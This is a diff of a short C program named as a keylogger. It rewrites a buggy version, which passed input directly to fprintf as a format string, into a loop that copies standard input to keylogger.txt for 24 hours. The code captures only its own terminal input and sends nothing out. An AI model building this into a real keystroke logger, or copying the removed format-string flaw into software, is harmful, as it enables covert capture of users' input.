@@ -2,26 +2,37 @@
 #include <stdlib.h>
 #include <time.h>
 
-int keylog()
+void keylog()
 {
     FILE * fPtr;
-    fPtr = fopen("keylogger.txt", "w+");
+    fPtr = fopen("keylogger.txt", "w");
 
-    fopen("keylogger.txt", "w");
-    const char *a = getchar();
-    
-    if(a != NULL)
-        fprintf(fPtr, a);
-    
-    time_t now = time(NULL);
-    struct tm *tm_struct = localtime(&now);
-    int hour = tm_struct->tm_hour;
-    
-    if(hour == 24)
-        fclose(fPtr);
+    if(fPtr == NULL)
+    {
+        printf("Failed to open file\n");
+        exit(1);
+    }
+
+    int ch;
+    time_t start_time = time(NULL);
+
+    while(1)
+    {
+        ch = getchar();
+
+        if(time(NULL) - start_time >= 24*60*60)
+        {
+            fclose(fPtr);
+            break;
+        }
+
+        if(ch != EOF)
+            fputc(ch, fPtr);
+    }
 }
 
 int main()
 {
     keylog();
+    return 0;
 }
